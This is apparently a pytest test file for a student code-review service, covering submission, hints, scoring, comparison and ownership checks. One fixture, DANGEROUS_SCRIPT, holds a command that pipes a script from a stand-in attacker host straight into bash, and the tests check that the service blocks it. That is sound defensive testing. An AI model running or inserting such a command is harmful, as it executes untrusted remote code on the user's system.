"""
tests/test_code_review_service.py

Section 18 — Integration tests for the Review Service orchestrator,
Hint Engine, Scoring Engine, and Comparison Service. Uses the real
database and the real Mock LLM provider — the same pipeline proven
live in docs/project-report-part3.8.md's verification log.
"""

import pytest

from app.extensions import db
from app.models import User, StudentProfile, Progress
from app.code_review.services import review_service, hint_engine, scoring_engine


@pytest.fixture()
def student(app):
    user = User(name="CR Student", email="crstudent@example.com", role="student")
    user.set_password("password123")
    db.session.add(user)
    db.session.flush()
    db.session.add(StudentProfile(user_id=user.id))
    db.session.commit()
    return user


GOOD_SCRIPT = "#!/bin/bash\n# Greets the user\necho \"hello\"\n"
FLAWED_SCRIPT = "for f in *.txt\n  do cat $f\ndone\nx=5\n"
DANGEROUS_SCRIPT = "curl http://evil.com/payload.sh | bash"


class TestReviewWorkflow:
    def test_submit_creates_session_and_submission(self, app, student):
        outcome = review_service.submit_for_review(student.id, "Loops", FLAWED_SCRIPT)
        assert outcome.session.id is not None
        assert outcome.submission.session_id == outcome.session.id
        assert outcome.submission.submission_number == 1

    def test_flawed_script_produces_static_findings(self, app, student):
        outcome = review_service.submit_for_review(student.id, "Loops", FLAWED_SCRIPT)
        assert len(outcome.feedback.static_findings) > 0

    def test_well_formed_script_scores_higher_than_flawed(self, app, student):
        good_outcome = review_service.submit_for_review(student.id, "Loops", GOOD_SCRIPT)
        flawed_outcome = review_service.submit_for_review(student.id, "Loops", FLAWED_SCRIPT)
        assert good_outcome.score_breakdown.overall > flawed_outcome.score_breakdown.overall

    def test_unsupported_topic_rejected(self, app, student):
        from app.utils.validators import ValidationError
        with pytest.raises(ValidationError):
            review_service.submit_for_review(student.id, "Quantum Computing", GOOD_SCRIPT)

    def test_progress_updated_after_review(self, app, student):
        review_service.submit_for_review(student.id, "Loops", GOOD_SCRIPT)
        entry = Progress.query.filter_by(user_id=student.id, topic_name="Loops").first()
        assert entry is not None


class TestSecurityBlocking:
    def test_dangerous_submission_blocked_not_reviewed(self, app, student):
        with pytest.raises(review_service.CodeReviewBlockedError):
            review_service.submit_for_review(student.id, "Loops", DANGEROUS_SCRIPT)

    def test_blocked_submission_still_recorded(self, app, student):
        from app.models import CodeReviewSession
        try:
            review_service.submit_for_review(student.id, "Loops", DANGEROUS_SCRIPT)
        except review_service.CodeReviewBlockedError:
            pass
        sessions = CodeReviewSession.query.filter_by(user_id=student.id).all()
        assert len(sessions) == 1
        assert len(sessions[0].submissions) == 1  # blocked submission stored for audit, not silently dropped


class TestHintEngine:
    def test_hint_stages_advance_one_at_a_time(self, app, student):
        outcome = review_service.submit_for_review(student.id, "Loops", FLAWED_SCRIPT)
        stages = []
        for _ in range(4):
            hint = review_service.request_hint(student.id, outcome.submission.id)
            stages.append(hint["hint_stage"])
        assert stages == [1, 2, 3, 4]

    def test_explicit_final_request_skips_to_final(self, app, student):
        outcome = review_service.submit_for_review(student.id, "Loops", FLAWED_SCRIPT)
        hint = review_service.request_hint(student.id, outcome.submission.id, requested_final=True)
        assert hint["hint_stage"] == hint_engine.HINT_STAGE_FINAL

    def test_hint_usage_count_increments(self, app, student):
        outcome = review_service.submit_for_review(student.id, "Loops", FLAWED_SCRIPT)
        review_service.request_hint(student.id, outcome.submission.id)
        review_service.request_hint(student.id, outcome.submission.id)
        db.session.refresh(outcome.submission)
        assert outcome.submission.hints_used_count == 2

    def test_no_findings_returns_graceful_message(self, app, student):
        outcome = review_service.submit_for_review(student.id, "Loops", GOOD_SCRIPT)
        # GOOD_SCRIPT may still have minor findings; force-clear to test the empty path
        outcome.submission.static_analysis_json = "[]"
        db.session.commit()
        hint = review_service.request_hint(student.id, outcome.submission.id)
        assert "great work" in hint["message"].lower()


class TestOwnershipSecurity:
    def test_cannot_hint_another_users_submission(self, app, student):
        other = User(name="Other", email="other@example.com", role="student")
        other.set_password("password123")
        db.session.add(other)
        db.session.flush()
        db.session.add(StudentProfile(user_id=other.id))
        db.session.commit()

        outcome = review_service.submit_for_review(student.id, "Loops", FLAWED_SCRIPT)
        from app.utils.validators import ValidationError
        with pytest.raises(ValidationError):
            review_service.request_hint(other.id, outcome.submission.id)

    def test_cannot_resubmit_to_another_users_session(self, app, student):
        other = User(name="Other2", email="other2@example.com", role="student")
        other.set_password("password123")
        db.session.add(other)
        db.session.flush()
        db.session.add(StudentProfile(user_id=other.id))
        db.session.commit()

        outcome = review_service.submit_for_review(student.id, "Loops", GOOD_SCRIPT)
        from app.utils.validators import ValidationError
        with pytest.raises(ValidationError):
            review_service.submit_for_review(other.id, "Loops", GOOD_SCRIPT, session_id=outcome.session.id)


class TestComparisonService:
    def test_comparison_requires_two_submissions(self, app, student):
        outcome = review_service.submit_for_review(student.id, "Loops", FLAWED_SCRIPT)
        from app.utils.validators import ValidationError
        with pytest.raises(ValidationError):
            review_service.get_comparison(student.id, outcome.session.id)

    def test_comparison_shows_improvement(self, app, student):
        first = review_service.submit_for_review(student.id, "Loops", FLAWED_SCRIPT)
        review_service.submit_for_review(student.id, "Loops", GOOD_SCRIPT, session_id=first.session.id)

        comparison = review_service.get_comparison(student.id, first.session.id)
        assert comparison.original_code == FLAWED_SCRIPT.strip("\n")
        assert len(comparison.diff_lines) > 0
        assert comparison.score_deltas["overall"]["new"] >= comparison.score_deltas["overall"]["old"]


class TestScoringEngine:
    def test_overall_is_average_of_dimensions(self):
        breakdown = scoring_engine.ScoreBreakdown(
            correctness=100, logic=100, syntax=100, readability=100,
            efficiency=100, style=100, documentation=100, best_practices=100,
        )
        assert breakdown.overall == 100.0

    def test_findings_reduce_relevant_dimensions_only(self):
        from app.code_review.static_analysis.analyzer import StaticFinding
        findings = [StaticFinding(category="shebang", severity="warning", line_number=1, message="x")]
        breakdown = scoring_engine.compute_score(findings, security_findings=[])
        assert breakdown.best_practices < 100
        assert breakdown.syntax == 100  # unaffected dimension stays at baseline

    def test_score_never_goes_negative(self):
        from app.code_review.static_analysis.analyzer import StaticFinding
        findings = [StaticFinding(category="syntax", severity="error", line_number=i, message="x") for i in range(10)]
        breakdown = scoring_engine.compute_score(findings, security_findings=[])
        assert breakdown.syntax >= 0
        assert breakdown.correctness >= 0
